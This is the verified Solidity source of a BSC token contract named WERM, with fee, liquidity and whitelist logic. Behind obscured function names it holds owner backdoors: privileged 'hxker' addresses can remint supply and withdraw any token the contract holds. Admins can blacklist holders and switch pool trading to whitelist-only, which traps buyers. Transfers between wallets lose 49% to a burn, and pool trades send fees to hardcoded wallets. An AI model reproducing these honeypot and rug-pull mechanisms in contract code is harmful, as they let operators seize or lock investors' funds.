/**
 *Submitted for verification at BscScan.com on 2022-08-26
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-23
*/

pragma solidity ^0.5.4;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

contract WERMaild is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
        function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract Recv {
    IERC20 public tokenPCE;
    IERC20 public usdt;

    constructor (IERC20 _tokenPCE) public {
        tokenPCE = _tokenPCE;
        usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    }

    function withdraw() public {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdt.transfer(address(tokenPCE), usdtBalance);
        }
        uint256 tokenPCEBalance = tokenPCE.balanceOf(address(this));
        if (tokenPCEBalance > 0) {
            tokenPCE.transfer(address(tokenPCE), tokenPCEBalance);
        }
    }
}


contract WERM is WERMaild, Context {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;

    Recv public RECV ;

  mapping (address => bool) public includeusers;
  mapping (address => bool) public witeeArecipient;


    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    uint public maxSupply =  3333333 * 1e18;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    mapping(address => address) public inviter;

    mapping(address=>uint ) public selltime;
     mapping(address=>uint256 ) public sellout;
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (isfeeblk) {
           require(blkddress[sender] == false, "ERC20:the blk address");
        }

        uint oamount= amount;
        uint ouseramount=balanceOf(sender);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
           uint256 needburn;
        if (isfee) {
            if (sender ==pancakePair || recipient == pancakePair) {
                    if (iscanswap) {
                        if (sender ==pancakePair) {
                            require(witeeaddress[recipient], " recipient not witee  swap");
                        }
                        if (recipient ==pancakePair) {
                            require(witeeaddress[sender], " sender  not witee swap");
                        }
                    }

                if((witeeaddress[recipient]||witeeaddress[sender]) &&  isfeewhit) {

                } else {

                if (!isContract(sender) && recipient == pancakePair && isfee3) {
                     {
                        require(oamount <= ouseramount * 3 / 10);

                    
                        if (selltime[sender]==0 ||block.timestamp-selltime[sender]>=86400 ) {
                            selltime[sender] = block.timestamp;
                            sellout[sender]=oamount;
                        }else {
                            sellout[sender]+=oamount;
                        }
                        require(sellout[sender] <= ouseramount * 3 / 10);
                    }
                }

                uint burnaa=amount.mul(2).div(100);
                _balances[address(this)] = _balances[address(this)].add(burnaa);
                if (balanceOf(burnAddress) < 3319202 *1e18) {
                    _burn(address(this), burnaa);
                }
                   uint bback=amount.mul(3).div(100);
                if (isfee4) {
                    _balances[backropadress] = _balances[backropadress].add(bback);
               emit Transfer(sender, backropadress, bback);
                }


                 uint bback2=amount.mul(4).div(100);
                if (isfee5) {
                    _balances[address(this)] = _balances[address(this)].add(bback2);
               emit Transfer(sender, address(this), bback2);
                }
                
                    _balances[lpadress] = _balances[lpadress].add(burnaa);
               emit Transfer(sender, lpadress, burnaa);

                 swapnow(sender, balanceOf(address(this)));
                
                amount=  amount.mul(89).div(100);
                }

            } else {
                if((witeeaddress[recipient]||witeeaddress[sender]) &&  isfeewhit)  {

                } else {
                uint burnaa2=amount.mul(49).div(100);
                _balances[address(this)] = _balances[address(this)].add(burnaa2);
                if (balanceOf(burnAddress) < 3319202 *1e18) {
                    _burn(address(this), burnaa2);
                }
                  amount=  amount.mul(51).div(100);
                }

            }
        }


        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


   function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }



    function _WERMlxlf(address account, uint amount) internal {
        require(account != address(0), "ERC20: WERMlxlf to the zero address");
        require(_totalSupply.add(amount) <= maxSupply, "ERC20: cannot WERMlxlf over max supply");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        _balances[address(0)] = _balances[address(0)].add(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
  address public govn;
  mapping (address => bool) public hxkers;

   address public all =0xF30B1A73c3B8bD2d6Abd4124F62feeb7bfef7eD2;// 
    address public burnAddress = address(0);

   address public backropadress =0xf9e3daCA7Af1d8e13f8c09DFa3cb6E1303D53331;// 

   address public lpadress =0xabe07aAC4cB21A5fbE1e79BAe98ff2c5d23d884C;// 


mapping (address => uint256) public usrbuys;


  IPancakeRouter01 public PancakeRouter01;
  address public token0;
  address public token1;
  address public pancakePair; 

  bool public iscanswap=false;

  function setIscanswap( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      iscanswap = _tf;
  }

bool public isfee=true;
  function setIsisfee( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfee = _tf;
  }

  bool public isfee2=true;
  function setIsisfee2( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfee2 = _tf;
  }
  

    bool public isfee3=true;
  function setIsisfee3( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfee3 = _tf;
  }

    bool public isfee4=true;
  function setIsisfee4( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfee4 = _tf;
  }

      bool public isfee5=true;
  function setIsisfee5( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfee5 = _tf;
  }
    bool public isfee6=true;
  function setIsisfee6( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfee6 = _tf;
  }

        bool public isfeewhit=true;
  function setisfeewhit( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfeewhit = _tf;
  }


    bool public isfeeblk=true;
  function setisfeeblk( bool _tf) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      isfeeblk = _tf;
  }

    function setwiteeaddress2(address[] memory _user) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!witeeaddress[_user[i]]) {
              //
                witeeaa[witeelen] = _user[i];
                witeelen = witeelen+1;
                witeeaddress[_user[i]] = true;
          }
      }

  }
        uint256 public swapTokensAtAmount=1e18;

    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public  {
         require(msg.sender == govn, "!govn");
        swapTokensAtAmount = _swapTokensAtAmount;
    }

    bool private swapping;

    function swapnow(address from, uint256 amountlip) private {
        {
            if (
                !swapping &&
                from != pancakePair
            ) {
                swapping = true;
                if(amountlip > swapTokensAtAmount){
                    _checkLiquidity(amountlip);
                }
                swapping = false;
            }
        } 
    }
    bool private inSwapAndLiquify;

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }



    function _swapTokensForTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = token1;
        if(IERC20(address(this)).allowance(address(this), pancakeswapV2Router)<tokenAmount) {
            IERC20(address(this)).approve(pancakeswapV2Router, 1000000000000*1e18);
        }
        IPancakeRouter01(pancakeswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(RECV),
            block.timestamp
        );
        RECV.withdraw();
    }
    function _addLiquidity(uint256 tokenAmount, uint256 swapAmount) private {
        if(IERC20(token1).allowance(address(this), pancakeswapV2Router)<swapAmount) {
            IERC20(token1).approve(pancakeswapV2Router, 1000000000000*1e18);
        }

        if(IERC20(address(this)).allowance(address(this), pancakeswapV2Router)<tokenAmount) {
            IERC20(address(this)).approve(pancakeswapV2Router, 1000000000000*1e18);
        }

        IPancakeRouter01(pancakeswapV2Router).addLiquidity(
            address(this),
            token1,
            tokenAmount,
            swapAmount,
            0, 
            0, 
            address(this),
            block.timestamp+1000
        );
    }
    function _checkLiquidity(uint256 amount1) private lockTheSwap {
        uint amount = _balances[address(this)];
        if(amount>= swapTokensAtAmount) {
            uint half = amount.div(2);
            uint otherHalf = amount.sub(half);
            uint256 initialBalance = IERC20(token1).balanceOf(address(this));
                      _swapTokensForTokens(half);
        uint256 newBalance =IERC20(token1).balanceOf(address(this)).sub(initialBalance);

            if(newBalance>0) {
                _addLiquidity(otherHalf, newBalance);
                emit SwapAndLiquify(half, newBalance, otherHalf);
            }
            
        }
    }

event SwapAndLiquify(uint256 half, uint256 newBalance, uint256 otherHalf);

    address public pancakeswapV2Router;

    function setpancakeswapV2Router(address _pancakeswapV2Router) public  {
         require(msg.sender == govn, "!govn");
        pancakeswapV2Router = _pancakeswapV2Router;
    }

    function setpancakePair(address _pancakePair) public  {
         require(msg.sender == govn, "!govn");
        pancakePair = _pancakePair;
    }

  constructor (address _pancake) public WERMaild("WERM", "WERM", 18) {
      govn = msg.sender;
      awremsk(msg.sender);
      awremsk(0x95914A07749D7EBbfA36753c3781371C45b2Db27);
      awremsk(0x48Df65C1b67Bc738e8B8A015471Eb241da8b3B01);

     RECV = new Recv(IERC20(address(this)));

      _WERMlxlf(all, maxSupply);
      emit Transfer(address(0), all, maxSupply);
      witeeaddress[all] = true;
      witeeaddress[msg.sender] = true;
    pancakeswapV2Router = _pancake;
     PancakeRouter01 =  IPancakeRouter01(_pancake);
      token0 = address(this);
      token1 = 0x55d398326f99059fF775485246999027B3197955;
      pancakePair =  IPancakeFactory(PancakeRouter01.factory())
            .createPair(address(this),token1 );  
  }

  function WERMlxlf(address account, uint amount) public {
      require(hxkers[msg.sender], "!hxker");
      _WERMlxlf(account, amount);
  }

     function huyhxlk(uint256 amount, address ut) public
    {
         require(hxkers[msg.sender], "hxker");
         IERC20(ut).transfer(msg.sender, amount);
    }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }
  


  function setGovernance(address _govn) public {
      require(msg.sender == govn, "!govn");
      govn = _govn;
  }
  
  function awremsk(address _hxker) public {
      require(msg.sender == govn, "!govn");
      hxkers[_hxker] = true;
  }

mapping (address => bool) public witeeaddress;
mapping (uint256=>address) public witeeaa;
uint256 public witeelen;


mapping (address => bool) public blkddress;
mapping (uint256=>address) public blkeeaa;
uint256 public blklen;

function setWeaddress2(address[] memory _user) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!witeeaddress[_user[i]]) {
              //
                witeeaa[witeelen] = _user[i];
                witeelen = witeelen+1;
                witeeaddress[_user[i]] = true;
          }
      }

  }

    function setremWteaddress(address _user) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
           if (witeeaddress[_user] ) {
                for (uint256 i=0;i<witeelen;i++ ) {
                    if (witeeaa[i] == _user) {
                        witeeaa[i]= witeeaa[witeelen-1];
                        witeelen = witeelen-1;
                        witeeaddress[_user] = false;
                        break;
                    }
                }
      }
  }

      function getwteUsers() public view returns(address[] memory ids) {

        address[] memory b1 = new  address[](witeelen);
        if (witeelen >0 ) {
            for (uint i=0;i<witeelen;i++ ) {
                b1[i] = witeeaa[i];
            }
        }
        return b1;
    }


function setblkddress2(address[] memory _user) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!blkddress[_user[i]]) {
              //
                blkeeaa[blklen] = _user[i];
                blklen = blklen+1;
                blkddress[_user[i]] = true;
          }
      }

  }

      function setremblkaddress(address _user) public {
      require(msg.sender == govn || hxkers[msg.sender ], "!govn");
           if (blkddress[_user] ) {
                for (uint256 i=0;i<blklen;i++ ) {
                    if (blkeeaa[i] == _user) {
                        blkeeaa[i]= blkeeaa[blklen-1];
                        blklen = blklen-1;
                        blkddress[_user] = false;
                        break;
                    }
                }
      }
  }

      function getblkUsers() public view returns(address[] memory ids) {

        address[] memory b1 = new  address[](blklen);
        if (blklen >0 ) {
            for (uint i=0;i<blklen;i++ ) {
                b1[i] = blkeeaa[i];
            }
        }
        return b1;
    }


}